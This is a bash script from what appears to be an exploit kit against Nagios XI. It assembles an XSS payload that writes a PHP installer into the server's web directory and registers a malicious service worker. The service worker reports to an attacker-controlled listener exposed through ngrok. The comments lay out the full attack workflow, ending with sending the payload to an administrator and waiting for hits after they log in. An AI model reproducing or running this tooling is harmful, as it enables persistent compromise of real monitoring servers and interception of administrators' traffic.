#!/bin/bash

# Setting up for the service worker
# - Start a listener to receive requests from the service worker.  For example `node catch-sw-server.js 8000`(you may need to run `npm install` first).
# - You'll need an https listener and using https://ngrok.com/ can be helpful, for instance `ngrok http 8000` will provide a public https url that forwards to a local server on port 8000.
# - Get your ngrok url and to create an XSS payload via something like `./package-sw-payload.sh https://5bbd626856a8.ngrok.io`.  This generates `register-service-worker.js` in the payloads directory.
# - Now you can package up the payload with `./package-payload.py register-service-worker.js --account --host 'https://nagios.lan'` (service workers require accessing the server via https)
# - Send it to the admin and then wait for them to login, at which point you should get hits on your listener.

if test "$#" -ne 1; then
    echo "USAGE: $0 LISTENER_URL_WITHOUT_TRAILING_SLASH"
    exit
fi

# A little prep work getting directories
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PAYLOAD_DIR="$SCRIPT_DIR/../payloads"
SW_INSTALLER_DIR="$PAYLOAD_DIR/register_service_worker"
LISTENER=$(echo "$1" | sed 's/\//\\\//g')
cd /tmp

# Put listener url in service worker
cat "$SW_INSTALLER_DIR/sw.js" | sed "s/%%LISTENER%%/$LISTENER/g" > sw.js

# Put service worker in installer php script, encode to base64
B64_PAYLOAD=$(cat "$SW_INSTALLER_DIR/install-sw.php" | sed -e '/%%SW_CONTENTS%%/{r sw.js' -e 'd' -e '}' | base64)

# Put base64 contents inside the plugin shell script
echo -n "echo '" > /tmp/plugin.sh
echo -n "$B64_PAYLOAD" >> /tmp/plugin.sh
echo "' | base64 -d > /usr/local/nagiosxi/html/includes/components/highcharts/exporting-server/temp/install-sw.php" >> plugin.sh

# Put shell script inside XSS payload
cat "$SW_INSTALLER_DIR/xss.js" | sed -e '/%%SW_PLUGIN_PAYLOAD%%/{r plugin.sh' -e 'd' -e '}' > "$PAYLOAD_DIR/register-service-worker.js"